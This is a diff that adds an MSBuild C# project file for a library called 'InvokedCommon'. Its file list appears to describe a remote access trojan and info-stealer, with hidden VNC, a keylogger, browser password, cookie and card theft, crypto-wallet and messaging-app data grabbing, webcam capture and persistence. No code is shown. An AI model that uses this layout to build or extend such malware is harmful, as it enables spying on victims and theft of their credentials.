@@ -1,0 +1,227 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{467046A7-A9CA-439D-BCF4-10CE2913EA5F}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AssemblyName>InvokedCommon</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <ApplicationVersion>0.0.0.0</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>InvokedCommon</RootNamespace>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="protobuf-net">
+      <HintPath>lib\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="NativeMethods.cs" />
+    <Compile Include="Video\Resolution.cs" />
+    <Compile Include="Video\Compression\JpgCompression.cs" />
+    <Compile Include="Video\Codecs\UnsafeStreamCodec.cs" />
+    <Compile Include="Utilities\ByteConverter.cs" />
+    <Compile Include="Utilities\SafeRandom.cs" />
+    <Compile Include="Structs\HvncOptions.cs" />
+    <Compile Include="Structs\AppsOptions.cs" />
+    <Compile Include="Structs\CryptoInfo.cs" />
+    <Compile Include="Structs\TelegramInfo.cs" />
+    <Compile Include="Structs\SteamInfo.cs" />
+    <Compile Include="Structs\OBSInfo.cs" />
+    <Compile Include="Structs\NgrokInfo.cs" />
+    <Compile Include="Structs\WinScpInfo.cs" />
+    <Compile Include="Structs\FileZillaInfo.cs" />
+    <Compile Include="Structs\FoxMailInfo.cs" />
+    <Compile Include="Structs\DiscordUserData.cs" />
+    <Compile Include="Structs\Login.cs" />
+    <Compile Include="Structs\Cookie.cs" />
+    <Compile Include="Structs\AutoFill.cs" />
+    <Compile Include="Structs\Download.cs" />
+    <Compile Include="Structs\HistoryEntry.cs" />
+    <Compile Include="Structs\ChromiumBrowserOptions.cs" />
+    <Compile Include="Structs\ChromiumBrowser.cs" />
+    <Compile Include="Structs\ChromiumProfile.cs" />
+    <Compile Include="Structs\AppsData.cs" />
+    <Compile Include="Structs\ChromiumCreditCard.cs" />
+    <Compile Include="Structs\ChromiumPasswordExtension.cs" />
+    <Compile Include="Structs\ChromiumCryptoExtension.cs" />
+    <Compile Include="Structs\GeckoBrowserOptions.cs" />
+    <Compile Include="Structs\GeckoBrowser.cs" />
+    <Compile Include="Structs\GeckoProfile.cs" />
+    <Compile Include="Structs\GeckoCreditCard.cs" />
+    <Compile Include="Structs\GeckoAddressInfo.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="Networking\Client.cs" />
+    <Compile Include="Networking\ISender.cs" />
+    <Compile Include="Networking\PayloadReader.cs" />
+    <Compile Include="Networking\PayloadWriter.cs" />
+    <Compile Include="Models\Drive.cs" />
+    <Compile Include="Models\FileChunk.cs" />
+    <Compile Include="Models\FileSystemEntry.cs" />
+    <Compile Include="Models\Process.cs" />
+    <Compile Include="Models\RecoveredAccount.cs" />
+    <Compile Include="Models\RegSeekerMatch.cs" />
+    <Compile Include="Models\RegValueData.cs" />
+    <Compile Include="Models\StartupItem.cs" />
+    <Compile Include="Models\TcpConnection.cs" />
+    <Compile Include="MessageHandlers\NotificationMessageProcessor.cs" />
+    <Compile Include="Messages\ClientIdentification.cs" />
+    <Compile Include="Messages\ClientIdentificationResult.cs" />
+    <Compile Include="Messages\GetSystemSummaryDesktopImageResponse.cs" />
+    <Compile Include="Messages\GetSystemSummaryInfo.cs" />
+    <Compile Include="Messages\GetSystemSummaryInfoResponse.cs" />
+    <Compile Include="Messages\DoAskElevate.cs" />
+    <Compile Include="Messages\DoChangeRegistryValue.cs" />
+    <Compile Include="Messages\DoClientDisconnect.cs" />
+    <Compile Include="Messages\DoClientReconnect.cs" />
+    <Compile Include="Messages\DoClientUninstall.cs" />
+    <Compile Include="Messages\DoCloseConnection.cs" />
+    <Compile Include="Messages\DoCreateRegistryKey.cs" />
+    <Compile Include="Messages\DoCreateRegistryValue.cs" />
+    <Compile Include="Messages\DoDeleteRegistryKey.cs" />
+    <Compile Include="Messages\DoDeleteRegistryValue.cs" />
+    <Compile Include="Messages\DoLoadRegistryKey.cs" />
+    <Compile Include="Messages\DoPathDelete.cs" />
+    <Compile Include="Messages\DoPathRename.cs" />
+    <Compile Include="Messages\DoProcessEnd.cs" />
+    <Compile Include="Messages\DoProcessResponse.cs" />
+    <Compile Include="Messages\DoProcessStart.cs" />
+    <Compile Include="Messages\DoRenameRegistryKey.cs" />
+    <Compile Include="Messages\DoRenameRegistryValue.cs" />
+    <Compile Include="Messages\DoShellExecute.cs" />
+    <Compile Include="Messages\DoShellExecuteResponse.cs" />
+    <Compile Include="Messages\DoShowMessageBox.cs" />
+    <Compile Include="Messages\DoShutdownAction.cs" />
+    <Compile Include="Messages\DoStartupItemAdd.cs" />
+    <Compile Include="Messages\DoStartupItemRemove.cs" />
+    <Compile Include="Messages\DoVisitWebsite.cs" />
+    <Compile Include="Messages\FileTransferCancel.cs" />
+    <Compile Include="Messages\FileTransferChunk.cs" />
+    <Compile Include="Messages\FileTransferComplete.cs" />
+    <Compile Include="Messages\FileTransferRequest.cs" />
+    <Compile Include="Messages\GetChangeRegistryValueResponse.cs" />
+    <Compile Include="Messages\GetConnections.cs" />
+    <Compile Include="Messages\GetConnectionsResponse.cs" />
+    <Compile Include="Messages\GetCreateRegistryKeyResponse.cs" />
+    <Compile Include="Messages\GetCreateRegistryValueResponse.cs" />
+    <Compile Include="Messages\GetDeleteRegistryKeyResponse.cs" />
+    <Compile Include="Messages\GetDeleteRegistryValueResponse.cs" />
+    <Compile Include="Messages\GetDirectory.cs" />
+    <Compile Include="Messages\GetDirectoryResponse.cs" />
+    <Compile Include="Messages\GetDrives.cs" />
+    <Compile Include="Messages\GetDrivesResponse.cs" />
+    <Compile Include="Messages\GetKeyloggerLogsDirectory.cs" />
+    <Compile Include="Messages\GetKeyloggerLogsDirectoryResponse.cs" />
+    <Compile Include="Messages\GetPasswords.cs" />
+    <Compile Include="Messages\GetPasswordsResponse.cs" />
+    <Compile Include="Messages\GetProcesses.cs" />
+    <Compile Include="Messages\GetProcessesResponse.cs" />
+    <Compile Include="Messages\GetRegistryKeysResponse.cs" />
+    <Compile Include="Messages\GetRenameRegistryKeyResponse.cs" />
+    <Compile Include="Messages\GetRenameRegistryValueResponse.cs" />
+    <Compile Include="Messages\GetStartupItems.cs" />
+    <Compile Include="Messages\GetStartupItemsResponse.cs" />
+    <Compile Include="Messages\GetSystemInfo.cs" />
+    <Compile Include="Messages\GetSystemInfoResponse.cs" />
+    <Compile Include="Messages\DoInputEventHVNC.cs" />
+    <Compile Include="Messages\DoNewProcessHVNC.cs" />
+    <Compile Include="Messages\DoOptionHVNC.cs" />
+    <Compile Include="Messages\DoOptionHVNCResponse.cs" />
+    <Compile Include="Messages\GetDesktopHVNC.cs" />
+    <Compile Include="Messages\GetDesktopResponseHVNC.cs" />
+    <Compile Include="Messages\SendHvncLog.cs" />
+    <Compile Include="Messages\SetHVNCStatus.cs" />
+    <Compile Include="Messages\IMessage.cs" />
+    <Compile Include="Messages\IMessageProcessor.cs" />
+    <Compile Include="Messages\MessageHandler.cs" />
+    <Compile Include="Messages\MessageProcessorBase`1.cs" />
+    <Compile Include="Messages\ProgressStatics.cs" />
+    <Compile Include="Messages\CheckPlugin.cs" />
+    <Compile Include="Messages\CheckPluginResponse.cs" />
+    <Compile Include="Messages\DoPlugin.cs" />
+    <Compile Include="Messages\GetLoadedPlugins.cs" />
+    <Compile Include="Messages\GetLoadedPluginsResponse.cs" />
+    <Compile Include="Messages\PluginDisconnect.cs" />
+    <Compile Include="Messages\PluginLoadedResponse.cs" />
+    <Compile Include="Messages\PluginStarted.cs" />
+    <Compile Include="Messages\DoKeyboardEvent.cs" />
+    <Compile Include="Messages\DoMouseEvent.cs" />
+    <Compile Include="Messages\GetDesktop.cs" />
+    <Compile Include="Messages\GetDesktopOldGfxEng.cs" />
+    <Compile Include="Messages\GetDesktopResponse.cs" />
+    <Compile Include="Messages\GetDesktopResponseOldGfxEng.cs" />
+    <Compile Include="Messages\GetMonitors.cs" />
+    <Compile Include="Messages\GetMonitorsResponse.cs" />
+    <Compile Include="Messages\SetRDStatus.cs" />
+    <Compile Include="Messages\SetStatus.cs" />
+    <Compile Include="Messages\SetStatusFileManager.cs" />
+    <Compile Include="Messages\SetUserStatus.cs" />
+    <Compile Include="Messages\GetStealerLogs.cs" />
+    <Compile Include="Messages\GetStealerLogsResponse.cs" />
+    <Compile Include="Messages\DoSurvivialInstall.cs" />
+    <Compile Include="Messages\NewSurvivalLog.cs" />
+    <Compile Include="Messages\TypeRegistry.cs" />
+    <Compile Include="Messages\DoWebcamStop.cs" />
+    <Compile Include="Messages\GetWebcamImage.cs" />
+    <Compile Include="Messages\GetWebcamImageResponse.cs" />
+    <Compile Include="Messages\GetWebcams.cs" />
+    <Compile Include="Messages\GetWebcamsResponse.cs" />
+    <Compile Include="Messages\ReverseProxy\ReverseProxyConnect.cs" />
+    <Compile Include="Messages\ReverseProxy\ReverseProxyConnectResponse.cs" />
+    <Compile Include="Messages\ReverseProxy\ReverseProxyData.cs" />
+    <Compile Include="Messages\ReverseProxy\ReverseProxyDisconnect.cs" />
+    <Compile Include="IO\FileSplit.cs" />
+    <Compile Include="Helpers\FileHelper.cs" />
+    <Compile Include="Helpers\PlatformHelper.cs" />
+    <Compile Include="Helpers\StringHelper.cs" />
+    <Compile Include="Extensions\DriveTypeExtensions.cs" />
+    <Compile Include="Extensions\SocketExtensions.cs" />
+    <Compile Include="Extensions\StringExtensions.cs" />
+    <Compile Include="Enums\AccountType.cs" />
+    <Compile Include="Enums\ConnectionState.cs" />
+    <Compile Include="Enums\ContentType.cs" />
+    <Compile Include="Enums\FileType.cs" />
+    <Compile Include="Enums\HVNCStatus.cs" />
+    <Compile Include="Enums\MouseAction.cs" />
+    <Compile Include="Enums\ProcessAction.cs" />
+    <Compile Include="Enums\RemoteDesktopStatus.cs" />
+    <Compile Include="Enums\ShutdownAction.cs" />
+    <Compile Include="Enums\StartupType.cs" />
+    <Compile Include="Enums\UserStatus.cs" />
+    <Compile Include="DNS\Host.cs" />
+    <Compile Include="DNS\HostsConverter.cs" />
+    <Compile Include="DNS\HostsManager.cs" />
+    <Compile Include="Cryptography\Aes256.cs" />
+    <Compile Include="Cryptography\SafeComparison.cs" />
+    <Compile Include="Cryptography\Sha256.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
